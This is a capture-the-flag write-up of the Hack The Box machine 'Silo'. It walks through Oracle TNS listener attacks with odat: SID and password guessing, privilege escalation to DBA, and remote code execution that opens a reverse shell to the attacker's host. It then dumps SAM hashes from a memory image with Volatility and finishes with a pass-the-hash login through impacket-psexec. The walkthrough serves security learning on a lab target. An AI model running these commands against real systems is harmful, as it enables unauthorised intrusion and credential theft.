# Silo [HTB](https://app.hackthebox.com/machines/131)
![silo-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/silo-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 silo.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/ports-02.png)

We get quite a lot of open ports. I'm guessing a lot of them are RPC ports, while other ports are shown as filtered. 

Let's run a service and version detection scan on the open ports with:

```bash
nmap -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -sCV silo.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/nmap-res-03.png)

![namp-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/nmap-res-04.png)

![nmap-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/nmap-res-05.png)

We have the following:

+ An IIS 8.5 server on port 80.
+ An RPC endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ Oracle TNS listener on ports 1521, 49159.
+ Other RPC related ports. 

Based on the nmap SMB scanning scripts we can guess that the target OS is either a 2008 or 2012 Windows server. We can also see that SMB message signing is not required:

![smb-sec-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/smb-sec-06.png)

I would like to start with the SMB server to see what we can gather. After that we can take a look at the IIS server which seems to be outdated (IIS 8.5 was released on Nov 13th 2013). 

The Oracle TNS-listener is not something you see in most CTF's.

Based on the [following document](https://www.integrigy.com/files/Integrigy_Oracle_Listener_TNS_Security.pdf) from Intergrity, The Oracle Database Listener is the database server software component that manages the network traffic between the Oracle Database and the client. The Oracle Database Listener listens on a specific network port (default 1521) and forwards network connections to the Database. The Listener is comprised of two binaries –(1) `tnslsnr` which is the Listener itself and (2) the Listener Control Utility `lsnrctl` which is used to administer the Listener on the server or remotely. 

The rest of the document explains the importance of securing the TNS listener. To me this sounds very interesting, so I found two more articals outlining how we can pentest the TNS listener. One artical is from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener) and the other is from [Medium](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573). We will use them if and when we go over the Oracle TNS listener. 


### SMB Port 445

Lets try to list out the available shares on the SMB server with a null session:

```bash
smbclient -N -L \\\\silo.htb\\
```

![smb-fail-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/smb-fail-07.png)

This is a sign that the SMB security is hardened. I tried running tools like `enum4linux`, `rpcclient`, `crackmapexec` but none of them worked. 

But, while running `crackmapexec smb silo.htb --users` I did manage to get the target's OS version and architecture:

![crackmap-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/crackmap-08.png)

Lets move on to the IIS server. 

### IIS Port 80

Let's open the website at `http://silo.htb`: 

![site-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/site-09.png)

We can see a default IIS installation page. Let's run a directory and file scan:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://silo.htb/FUZZ -e .aspx,.asp,.cgi,.txt,.xml,.html,.conf
```

Nothing came from this scan. Lets move to the Oracle TNS listener.


### Oracle TNS Listener Port 1521

Based on both articals from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener) and [medium](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573), the overall flow of pentesting the TNS listener is as follows:

1. Enumerate version info (search for known vulns). 
2. Enumerate/Bruteforce SID names (database names).
3. Bruteforce credentials for valid SIDs discovered.
4. Try to execute code.

As for step one, we got the version from the namp scan (11.2.0.2.0), I searched for known exploits for this version but I didnt find anything super useful. 

In step two we want to find valid SIDs on the listener. The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID. To enumerate SIDs we can use metasploit modules like `auxiliary/scanner/oracle/sid_enum` and  `auxiliary/admin/oracle/tnscmd` but I rather avoid metasploit. 

Instead we can use a custom tool called [tnscmd10g](https://www.kali.org/tools/tnscmd10g/), installed with `apt install tnscmd10g`. 


In order to pull valid SIDs we can run something like this: 

```bash
tnscmd10g status -h silo.htb
``` 

Unfortenataly this resulted in an `12618` error. Based on the [following resource](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7), this means that the TNS version is incompatible. In this case we can add the `-10G` switch:

```bash
tnscmd10g status -10G -h silo.htb
```

But this didnt help in my case. So I decided to use [odat](https://github.com/quentinhardy/odat) instead. `Odat` is a powerful tool for hacking Oracle databases. It can enumerate SIDs, find valid credentials, and exploit different attacks like TNS posining and RCE among other things. The tool can be installed with `apt install odat`


In order to find valid SID's we can run the following:

```bash
odat sidguesser -s silo.htb
```

![sid-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/sid-12.png)


Now that we found the database SID, we need to find valid credentials so we can perform other actions. To find credentials for a given SID we can run the following:

```bash
odat passwordguesser -s silo.htb -d XE
```

![account-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/account-13.png)

We can see `dota` found valid credentials of `scott : tiger` for the `XE` database. We can leverage the found credentials to try and get RCE. There are several ways to execute commands on the OS through the Oracle TNS listener, you can read more about them [here](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-rce-and-more#rce-java-store-procedure). 

The first one being the Java store procedure:

```bash
odat java -s silo.htb -U scott -P tiger -d XE --exec whoami
```

![java-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/java-14.png)


No luck here, let's try the task-scheduler:

```bash
odat dbmsscheduler  -s silo.htb -U scott -P tiger -d XE --exec "C:\windows\system32\cmd.exe /c whoami"
```

![insufficient-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/insufficient-15.png)

Here, we can see we got an `insufficient privileges` error. Let's check our user's privileges on the databasse with:

```bash
odat privesc -s 10.129.95.188 -U scott -P tiger -d XE --get-privs
```

![db-privs-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/db-privs-16.png)

We can see that we have the `CREATE/EXECUTE ANY PROCEDURE` privilege, We can leverage this to give our database user admin roles using:

```bash
odat privesc -s 10.129.95.188 -U scott -P tiger -d XE --dba-with-create-any-trigger
```

![add-dba-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/add-dba-17.png)

Now we can use the `--sysdba` switch to perform the operation with db-admin privileges. 

This time I decided to change the command syntax for the RCE because I was having issues with the previous command and I wanted to verify the success of the RCE, so I chose to ping my attack machine while capturing the network traffic using:

```bash
tcpdump -i tun0 icmp
```

Then, I ran the RCE with:

```bash
odat dbmsscheduler  -s silo.htb -U scott -P tiger -d XE --sysdba --exec "ping 10.10.14.69"
```

This operation finsihed without any errors. And in the `tcpdump` shell I got a ping:

![ping-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/ping-19.png)

Now in order to get a reverse shell we can use `odat` once again. All we need to do is set up a local listener with:

```bash
rlwrap nc -lnvp 443
```

And run the following:

```bash
odat dbmsscheduler  -s silo.htb -U scott -P tiger -d XE --sysdba --reverse-shell 10.10.14.69 443
```

![rshell-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/rshell-20.png)

On the listener window I recieve a connection:

![shell-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/shell-21.png)


Unfortenatly, this shell is a bit limited. For example running `whoami` or `hostname` doesnt work. But this is enough to elevate privileges and get the user flag:

![user-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/user-22.png)

## Privilege Escalation

After landing on the machine I start hunting for quick wins like `whoami /priv` for a potato attack, `cmdkey /list` for stored creds, and looking for creds in the registry but none of them worked for me with the current shell we have. 

So I decided to look around the filesystem. In our user's home folder I found the following:

![issue-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/issue-23.png)

The file reads as such:

![file-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/file-24.png)


It says that a memory dump is hosted in dropbox via the given url, but the password doesnt work to open the share. I thought maybe the true password is hidden via alternative data streams. So I ran `dir /r` but nothing came up. 

So I decdied to transfer the file to my attack machine and analyze it further. To achive this task I used `odat` once again:

```bash
odat externaltable -s silo.htb -U scott -P tiger -d XE --sysdba --getFile "C:\Users\Phineas\Desktop" "Oracle issue.txt" "test.txt"
```

![file-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/file-25.png)

Something is off with the first character of the password, probably encoding issues. There is a trick we can use in these situations. We can encode the file into bytes, then base64 encode the bytes, and then decode the base64 into utf-8. 

First, we need to understand the file's current encoding, for this we can use:

```bash
file "issue.txt"  # I renamed the file
```

![encodeing-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/encoding-26.png)

We can see the encoding is `iso-8859` also known as `latin-1`. Now that we know the encoding we can use Python to encode this to bytes and then base64. I made the following script:

```python
#!/usr/bin/python3

import base64

with open('issue.txt', 'r', encoding='latin-1') as file:
    data = file.read().encode()

print(base64.b64encode(data))
```

Running this returns a base64 encoded string:

![b64-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/b64-27.png)

Now we can use the following command to decdoe it to utf-8:

```bash
echo -n <base64_output> | base64 -d
```

![pass-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/pass-28.png)


Now we can see the password has changed, the first character was actually a `£`.

Now if we try to open the DropBox share:

![box-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/box-29.png)

The password works. Lets download this file and anaylze it. 


The file is a zip archive so I use `unzip` to extract it. Inside I find another zip archive named `SILO-20180105-221806.zip`, I use `uznip` once again and now I have the dump file:

![dump-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/dump-30.png)

In order to analyze this core dump, I use a custom tool called [Volatility](https://www.volatilityfoundation.org/releases1). You can follow along [this tutorial](https://www.youtube.com/watch?v=iJzndSbkN4Y&t=115s) on how to install it. 

After youv'e installed `volatility`, we can start analyzing the core dump. First we need to use the `kdbgscan` module so we can find a working profile that fits the core dump:

```bash
./volatility_2.5_linux_x64 kdbgscan -f SILO-20180105-221806.dmp
```

![profile-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/profile-31.png)

This one fits the OS version we found way back with `crackmapexec`. 

Now we need to get the offest for the registry hives, for that we can use the `hivelist` module:

```bash
./volatility_2.5_linux_x64 hivelist -f SILO-20180105-221806.dmp --profile Win2012R2x64
```

![hives-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/hives-32.png)

The SAM file is what we want. 

Now that we have the system and SAM registry offests we can extract its contents using the `hashdump` module:


```bash
./volatility_2.5_linux_x64 hashdump -f SILO-20180105-221806.dmp --profile Win2012R2x64 -y 0xffffc00000028000 -s 0xffffc00000619000
```

Where `-y` is for the system offset and `-s` is for the SAM file offset:

![sam-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/sam-33.png)

Now we can simply use `psexec` to get a shell as the admin:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 Administrator@silo.htb
```

![root-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Silo/img/root-34.png)
